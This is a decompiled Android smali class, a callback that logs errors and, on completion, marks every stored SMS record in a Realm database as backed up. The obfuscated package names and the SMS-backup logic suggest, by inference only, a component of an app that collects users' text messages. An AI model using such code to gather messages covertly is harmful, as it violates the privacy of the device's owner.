.class public Li/a/a/r$a$a;
.super Lg/m/a/e/d;
.source "sourcefile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Li/a/a/r$a;->onComplete()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Lg/m/a/e/d<",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# direct methods
.method public constructor <init>(Li/a/a/r$a;)V
    .locals 0
    .param p1, "this$1"    # Li/a/a/r$a;

    .line 1779
    invoke-direct {p0}, Lg/m/a/e/d;-><init>()V

    return-void
.end method

.method public static synthetic g(Lio/realm/Realm;)V
    .locals 3
    .param p0, "realm"    # Lio/realm/Realm;

    .line 1788
    const-class v0, Lgqegwqg/bbebebefff/asdcdsac/realm/Sms;

    invoke-virtual {p0, v0}, Lio/realm/Realm;->where(Ljava/lang/Class;)Lio/realm/RealmQuery;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "backup"

    invoke-virtual {v0, v2, v1}, Lio/realm/RealmQuery;->equalTo(Ljava/lang/String;Ljava/lang/Boolean;)Lio/realm/RealmQuery;

    move-result-object v0

    .line 1789
    invoke-virtual {v0}, Lio/realm/RealmQuery;->findAll()Lio/realm/RealmResults;

    move-result-object v0

    .line 1790
    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v0, v2, v1}, Lio/realm/RealmResults;->setValue(Ljava/lang/String;Ljava/lang/Object;)V

    .line 1788
    return-void
.end method


# virtual methods
.method public d(Lg/m/a/g/a;)V
    .locals 2
    .param p1, "e"    # Lg/m/a/g/a;

    .line 1782
    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "ddf"

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 1783
    return-void
.end method

.method public bridge synthetic f(Ljava/lang/Object;)V
    .locals 0

    .line 1779
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0}, Li/a/a/r$a$a;->h()V

    return-void
.end method

.method public h()V
    .locals 3

    const/4 v0, 0x0

    .line 1787
    .local v0, "response":Ljava/lang/String;
    invoke-static {}, Lio/realm/Realm;->getDefaultInstance()Lio/realm/Realm;

    move-result-object v1

    .line 1788
    .local v1, "realmv":Lio/realm/Realm;
    sget-object v2, Li/a/a/c;->a:Li/a/a/c;

    invoke-virtual {v1, v2}, Lio/realm/Realm;->executeTransactionAsync(Lio/realm/Realm$Transaction;)Lio/realm/RealmAsyncTask;

    .line 1791
    invoke-virtual {v1}, Lio/realm/Realm;->close()V

    .line 1795
    return-void
.end method
